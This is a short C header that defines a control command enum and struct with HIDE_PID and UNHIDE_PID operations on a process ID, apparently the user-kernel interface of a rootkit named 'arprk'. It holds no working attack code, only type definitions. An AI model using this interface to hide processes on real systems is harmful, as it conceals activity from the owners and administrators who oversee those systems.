#ifndef CTL_H

enum arprk_ctlcmd {
	ARPRK_CTLCMD_HIDE_PID = 1,
	ARPRK_CTLCMD_UNHIDE_PID,
};

struct arprk_ctl {
	enum arprk_ctlcmd cmd;
	pid_t pid;
};

#define CTL_H

#endif
